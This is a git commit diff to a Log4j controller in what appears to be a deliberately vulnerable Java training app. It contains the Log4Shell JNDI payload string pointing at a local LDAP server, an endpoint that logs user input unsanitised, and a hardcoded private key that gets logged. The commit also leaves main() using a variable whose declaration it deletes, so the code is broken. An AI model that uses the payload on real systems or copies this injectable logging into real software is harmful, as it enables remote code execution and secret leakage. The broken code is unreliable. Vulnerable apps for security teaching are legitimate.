5341f4e5c21d6b84e9033975defa8d9e64ba9f4d
wangwangping <49153254+wangwangping@users.noreply.github.com>
2025-03-04 10:06:25 +0800

    Update Log4j.java

--- src/main/java/org/joychou/controller/Log4j.java
+++ src/main/java/org/joychou/controller/Log4j.java
@@ -18,64 +18,15 @@ public class Log4j {
     @RequestMapping(value = "/log4j")
     public String log4j(String token) {
         String privateKey = "parivate";
-        logger.error("something wrong, token: {}, privateKey: {}", token, privateKey);
+        logger.info("token: {}, privateKey: {}", token, privateKey);
         return token;
     }
 
     public static void main(String[] args) {
         String poc = "${jndi:ldap://127.0.0.1:1389/0iun75}";
         logger.info(poc);
-        String token = "token";
         String privateKey = "parivate";
-        logger.error("something wrong, token: {}, privateKey: {}", token, privateKey);
+        logger.error("something went wrong, token: {}, privateKey: {}", token, privateKey);
     }
 
-    /**
-     * http://localhost:8080/log4j?token=${jndi:ldap://127.0.0.1:1389/0iun75}
-     * Default: error/fatal/off
-     * Fix: Update log4j to lastet version.
-     */
-    @RequestMapping(value = "/log4j1")
-    public String log4j1(String token) {
-        String privateKey = "parivate";
-        logger.error("something wrong, token: {}, privateKey: {}", token, privateKey);
-        return token;
-    }
-
-
-    /**
-     * http://localhost:8080/log4j?token=${jndi:ldap://127.0.0.1:1389/0iun75}
-     * Default: error/fatal/off
-     * Fix: Update log4j to lastet version.
-     */
-    @RequestMapping(value = "/log4j2")
-    public String log4j2(String token) {
-        String privateKey = "parivate";
-        logger.error("something wrong, token: {}, privateKey: {}", token, privateKey);
-        return token;
-    }
-
-    /**
-     * http://localhost:8080/log4j?token=${jndi:ldap://127.0.0.1:1389/0iun75}
-     * Default: error/fatal/off
-     * Fix: Update log4j to lastet version.
-     */
-    @RequestMapping(value = "/log4j3")
-    public String log4j3(String token) {
-        String privateKey = "parivate";
-        logger.error("something wrong, token: {}, privateKey: {}", token, privateKey);
-        return token;
-    }
-
-    /**
-     * http://localhost:8080/log4j?token=${jndi:ldap://127.0.0.1:1389/0iun75}
-     * Default: error/fatal/off
-     * Fix: Update log4j to lastet version.
-     */
-    @RequestMapping(value = "/log4j4")
-    public String log4j4(String token) {
-        String param = "param";
-        logger.error("something wrong, token: {}, param: {}", token, param);
-        return token;
-    }
 }
